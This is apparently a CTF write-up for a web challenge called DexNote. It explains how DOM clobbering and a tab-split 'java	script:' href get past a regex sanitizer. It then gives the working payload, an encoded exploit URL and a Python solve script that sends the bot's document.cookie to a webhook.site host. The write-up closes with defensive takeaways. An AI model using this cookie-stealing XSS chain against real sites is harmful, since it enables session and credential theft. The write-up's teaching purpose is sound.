---
title: "DexNote"
description: "CTF web challenge"
summary: "A client-side web challenge: DOM Clobbering meets a sanitizer bypass via tab-injected javascript: scheme to steal the bot's flag cookie."
date: 2026-09-26T00:00:00+02:00
lastmod: 2026-09-26T00:00:00+02:00
tags:
  - CTF
  - walkthrough
  - web
  - XSS
  - DOM-clobbering
  - sanitizer-bypass
categories:
  - writeup
cover: "covers/DexNote.webp"
draft: false
---

## Challenge Summary

**DexNote** is a client-side web challenge that serves a "Case Notes" application — a simple HTML note previewer with a custom sanitizer called **SpatterGuard**. An admin bot visits any URL you submit (restricted to the challenge origin) while carrying the flag in a cookie (`httpOnly: false`).

The goal is to steal the bot's cookie.

## Source Code Analysis

The application has four key files:

### `serve.mjs` — The Server

A minimal Node.js HTTP server that:

- Serves static files from `www/`.
- Exposes a `/report` endpoint where users submit URLs for the bot to visit.
- Validates that submitted URLs are on the same origin (`http://127.0.0.1:8080`).
- Sets the flag as a non-httpOnly cookie on the bot's browser:

```js
const cookie = {
  name: 'flag', value: flag,
  domain: '127.0.0.1', path: '/',
  httpOnly: false, secure: false
};
```

### `bot.js` — The Admin Bot

Uses headless Chrome via CDP (Chrome DevTools Protocol). It:

1. Creates a new browser context.
2. Sets the flag cookie via `Network.setCookie`.
3. Navigates to the submitted URL.
4. Waits 6 seconds, then closes.

### `spatterguard.js` — The Custom Sanitizer

A tag/attribute allowlist-based HTML sanitizer:

```js
const ALLOWED_TAGS = new Set([
  'A', 'IMG', 'B', 'I', 'U', 'EM', 'STRONG', 'P', 'DIV', 'SPAN',
  'UL', 'OL', 'LI', 'BR', 'H1', 'H2', 'H3', 'CODE', 'PRE', 'BLOCKQUOTE',
]);
const ALLOWED_ATTRS = new Set([
  'id', 'name', 'href', 'src', 'alt', 'title', 'class',
]);
const DANGEROUS_SCHEME = /^(javascript|data)\s*:/i;
```

For `href` and `src` attributes, it checks for dangerous schemes:

```js
if ((attr.name === 'href' || attr.name === 'src') &&
    DANGEROUS_SCHEME.test(attr.value.trim())) {
  child.removeAttribute(attr.name);
}
```

### `app.js` — The Frontend Logic

This is where the vulnerability lives:

```js
function applyTheme() {
  const theme = window.THEME || {};
  if (theme.redirect) {
    location.href = theme.redirect;
  }
}

function main() {
  renderNote();   // sanitize & render the note from the URL hash
  applyTheme();   // check window.THEME and redirect
}
```

The execution order is critical: first `renderNote()` adds sanitized HTML to the DOM, **then** `applyTheme()` checks `window.THEME`.

## Vulnerability Chain

### Step 1: DOM Clobbering `window.THEME.redirect`

The sanitizer allows the `id` and `name` attributes on `<a>` tags. This enables [DOM Clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering) — a technique where HTML elements with specific `id`/`name` attributes create properties on the `window` object.

When two elements share the same `id`, the browser exposes them as an `HTMLCollection` on `window`. An `HTMLCollection` supports named item access via the `name` attribute:

```html
<a id=THEME></a>
<a id=THEME name=redirect href="http://evil.com"></a>
```

- `window.THEME` → `HTMLCollection` (two elements with `id="THEME"`)
- `window.THEME.redirect` → the second `<a>` element (matched by `name="redirect"`)

When `location.href = theme.redirect` runs, JavaScript calls `toString()` on the anchor element, which returns its resolved `href`.

### Step 2: Bypassing SpatterGuard's Scheme Check

The sanitizer's regex to detect dangerous schemes is:

```js
/^(javascript|data)\s*:/i
```

This expects the literal string `javascript` or `data` at the start, optionally followed by whitespace, then a colon. But it doesn't account for **whitespace characters inside the scheme name**.

HTML and the URL spec handle tab characters (`\t`, `0x09`) differently:

- **In the DOM**: `attr.value` preserves the tab character literally. `"java\tscript:"` does **not** match the regex because `java<TAB>script` ≠ `javascript`.
- **In the URL parser**: the [WHATWG URL spec](https://url.spec.whatwg.org/#scheme-start-state) mandates stripping ASCII tabs and newlines during scheme resolution. So the anchor's `.href` getter returns `"javascript:..."` with the tab removed.

This means:

```html
<a href="java&#9;script:alert(1)">
```

1. `attr.value` = `"java\tscript:alert(1)"` → regex does **not** match → attribute is **kept**.
2. `element.href` (the getter) = `"javascript:alert(1)"` → tab is stripped by the URL parser.
3. `location.href = element` → `toString()` returns the resolved href → **JavaScript executes**.

### Step 3: Cookie Exfiltration

Combining both techniques, we craft a payload that:

1. DOM-clobbers `window.THEME.redirect` to point at an anchor element.
2. That anchor's `href` uses `java[TAB]script:` to bypass the sanitizer.
3. The JavaScript reads `document.cookie` and navigates to our webhook with the value URL-encoded.

## Exploit

### Payload

The raw HTML (the whitespace between `java` and `script` is a literal tab character `0x09`):

```html
<a id=THEME></a><a id=THEME name=redirect href="java	script:document.location='https://webhook.site/TOKEN/log?c='+encodeURIComponent(document.cookie)"></a>
```

### Final URL

URL-encode the payload into the hash fragment and submit it to the bot via `/report`:

```
http://127.0.0.1:8080/#note=%3Ca%20id%3DTHEME%3E%3C%2Fa%3E%3Ca%20id%3DTHEME%20name%3Dredirect%20href%3D%22java%09script%3Adocument.location%3D'https%3A%2F%2Fwebhook.site%2FTOKEN%2Flog%3Fc%3D'%2BencodeURIComponent(document.cookie)%22%3E%3C%2Fa%3E
```

### Execution Flow

1. Go to `http://CHALLENGE:8080/report`.
2. Submit the URL above (using `127.0.0.1:8080` as the origin).
3. The bot visits the URL with the flag cookie set.
4. `renderNote()` sanitizes the HTML — the `java\tscript:` href survives the regex check because the embedded tab breaks the pattern match.
5. The two `<a id=THEME>` elements are inserted into the DOM, creating `window.THEME` as an `HTMLCollection`.
6. `applyTheme()` reads `window.THEME.redirect` → resolves to the second anchor via named item access.
7. `location.href = theme.redirect` → `toString()` invokes the anchor's href getter which strips the tab → `javascript:document.location=...+encodeURIComponent(document.cookie)` executes.
8. The bot's browser navigates to our webhook with the flag in the query string.
9. Check the webhook for the incoming request containing `?c=flag%3DCATF%7B...%7D`.

### Solve Script

```python
import urllib.parse
import requests

CHALLENGE = "http://169.58.140.254:8080"
WEBHOOK   = "https://webhook.site/45e5395a-05d4-4572-8401-b7740aabdd85"

js = f"document.location='{WEBHOOK}/log?c='+encodeURIComponent(document.cookie)"
html = f'<a id=THEME></a><a id=THEME name=redirect href="java\tscript:{js}"></a>'
note = urllib.parse.quote(html)
url  = f"http://127.0.0.1:8080/#note={note}"

r = requests.post(f"{CHALLENGE}/report", data={"url": url})
print(r.status_code, r.text[:200])
print(f"\nCheck {WEBHOOK} for the flag cookie!")
```

## Flag

```
CATF{...}
```

## Key Takeaways

- **DOM Clobbering** is a powerful technique when code reads from `window.*` properties without initializing them first. The `applyTheme()` function uses `window.THEME || {}` — a perfect clobbering target since `THEME` is never explicitly defined.
- **Sanitizer bypasses** via tab/newline injection in URL schemes remain effective against regex-based checks. The URL spec's stripping of ASCII tabs during scheme parsing creates a gap between what the regex sees and what the browser resolves.
- **Defense**: use `new URL(href).protocol` instead of regex to check the **resolved** scheme, and initialize global variables explicitly (e.g., `const THEME = { redirect: null }` as a `const` declaration) before any user content is rendered to prevent DOM clobbering.
